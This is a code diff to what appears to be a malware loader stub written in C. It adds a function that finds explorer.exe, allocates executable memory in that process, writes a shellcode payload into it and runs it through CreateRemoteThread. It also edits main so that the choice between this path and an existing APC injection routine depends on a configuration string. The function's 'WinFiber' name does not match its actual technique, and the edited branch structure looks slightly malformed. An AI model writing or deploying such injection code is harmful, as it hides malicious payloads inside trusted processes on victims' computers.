@@ -266,6 +266,57 @@ void inject_APC(unsigned char *sc, size_t l) {
     CloseHandle(pi.hProcess);
 }
 
+void inject_WinFiber(LPCSTR targetProcName, PVOID payload, DWORD payload_len) {
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    DWORD targetPID = 0;
+
+    if (Process32First(hSnap, &pe32)) {
+        do {
+            if (_stricmp(pe32.szExeFile, targetProcName) == 0) {
+                targetPID = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+
+    if (!targetPID) {
+        DBG("[!] Could not find process %s\n", targetProcName);
+        return;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+    if (!hProcess) {
+        DBG("[!] OpenProcess failed: %lu\n", GetLastError());
+        return;
+    }
+
+    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        DBG("[!] VirtualAllocEx failed: %lu\n", GetLastError());
+        CloseHandle(hProcess);
+        return;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteMem, payload, payload_len, NULL)) {
+        DBG("[!] WriteProcessMemory failed: %lu\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return;
+    }
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+    if (!hThread) {
+        DBG("[!] CreateRemoteThread failed: %lu\n", GetLastError());
+    } else {
+        CloseHandle(hThread);
+    }
+
+    CloseHandle(hProcess);
+}
+
 int main() {
     DBG("[*] stub: entry\n");
     unsigned char *buf = payload;
@@ -300,11 +351,16 @@ int main() {
         #endif
     }
     else if (strcmp(payload_type, "shellcode") == 0) {
+    if (strcmp(enc_algo, "winfiber") == 0) {
+        DBG("[*] stub: injecting shellcode via WinFiber\n");
+        inject_WinFiber("explorer.exe", buf, len);  // default target
+    } else {
         DBG("[*] stub: injecting shellcode via APC\n");
         inject_APC(buf, len);
-        DBG("[*] stub: inject_APC returned\n");
     }
+}
 
     DBG("[*] stub: exit normally\n");
     return 0;
+
 }
